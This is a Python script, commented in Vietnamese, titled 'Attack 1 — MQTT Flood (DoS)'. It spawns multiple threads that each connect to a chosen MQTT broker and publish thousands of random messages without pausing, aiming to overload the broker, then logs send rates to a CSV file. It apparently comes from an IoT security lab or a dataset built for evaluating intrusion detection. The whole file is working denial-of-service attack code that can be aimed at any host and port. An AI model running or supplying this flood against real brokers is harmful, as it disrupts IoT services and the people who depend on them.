#!/usr/bin/env python3
"""
Attack 1 — MQTT Flood (DoS)
Gửi hàng nghìn PUBLISH message liên tục đến broker để làm quá tải.
Dùng multi-thread để tăng tốc độ tấn công.

Chạy:
    python3 attack1_mqtt_flood.py --host 10.0.0.1 --port 1883 --threads 10 --count 5000
"""

import paho.mqtt.client as mqtt
import time
import argparse
import threading
import random
import string
import logging
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(threadName)s] %(levelname)s — %(message)s"
)
log = logging.getLogger(__name__)

# ── Thống kê toàn cục ──────────────────────────────────────────────────────────
stats_lock  = threading.Lock()
total_sent  = 0
total_error = 0
start_time  = None


def random_payload(size: int = 64) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))


def flood_worker(broker_host: str, broker_port: int,
                 topic: str, count: int, qos: int, worker_id: int):
    global total_sent, total_error

    client_id = f"flood-attacker-{worker_id}-{random.randint(1000, 9999)}"
    client = mqtt.Client(client_id=client_id)

    try:
        client.connect(broker_host, broker_port, keepalive=60)
        client.loop_start()
    except Exception as e:
        log.error(f"Worker {worker_id}: không kết nối được → {e}")
        return

    sent = 0
    errors = 0
    for _ in range(count):
        payload = random_payload(random.randint(32, 256))
        result  = client.publish(topic, payload=payload, qos=qos)
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            sent += 1
        else:
            errors += 1
        # Không sleep — flood tối đa

    client.loop_stop()
    client.disconnect()

    with stats_lock:
        total_sent  += sent
        total_error += errors

    log.info(f"Worker {worker_id} xong: sent={sent}, errors={errors}")


def main():
    parser = argparse.ArgumentParser(description="MQTT Flood Attack (DoS)")
    parser.add_argument("--host",    default="127.0.0.1",      help="IP broker MQTT")
    parser.add_argument("--port",    type=int, default=1883,   help="Port broker")
    parser.add_argument("--topic",   default="iot/sensor/data",help="Topic đích")
    parser.add_argument("--threads", type=int, default=5,      help="Số thread tấn công")
    parser.add_argument("--count",   type=int, default=2000,   help="Số message / thread")
    parser.add_argument("--qos",     type=int, default=0,      help="QoS level (0/1/2)")
    args = parser.parse_args()

    global start_time
    total_msgs = args.threads * args.count

    log.info("=" * 60)
    log.info("  ATTACK 1 — MQTT FLOOD (DoS)")
    log.info(f"  Target  : {args.host}:{args.port}")
    log.info(f"  Topic   : {args.topic}")
    log.info(f"  Threads : {args.threads}  |  Msgs/thread: {args.count}")
    log.info(f"  Total   : {total_msgs} messages")
    log.info("=" * 60)

    start_time = time.time()
    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=flood_worker,
            args=(args.host, args.port, args.topic, args.count, args.qos, i + 1),
            name=f"Flood-{i+1}"
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    rate    = total_sent / elapsed if elapsed > 0 else 0

    log.info("=" * 60)
    log.info(f"  KẾT QUẢ FLOOD ATTACK")
    log.info(f"  Thời gian   : {elapsed:.2f}s")
    log.info(f"  Tổng gửi    : {total_sent}")
    log.info(f"  Lỗi         : {total_error}")
    log.info(f"  Tốc độ      : {rate:.1f} msg/s")
    log.info("=" * 60)

    # ── Lưu log CSV để evaluation ──────────────────────────────────────────────
    with open("attack1_flood_log.csv", "w") as f:
        f.write("attack_type,target,total_sent,total_error,duration_s,rate_msg_s,timestamp\n")
        f.write(f"mqtt_flood,{args.host}:{args.port},{total_sent},{total_error},"
                f"{elapsed:.2f},{rate:.1f},{datetime.now().isoformat()}\n")
    log.info("  Log đã lưu → attack1_flood_log.csv")


if __name__ == "__main__":
    main()
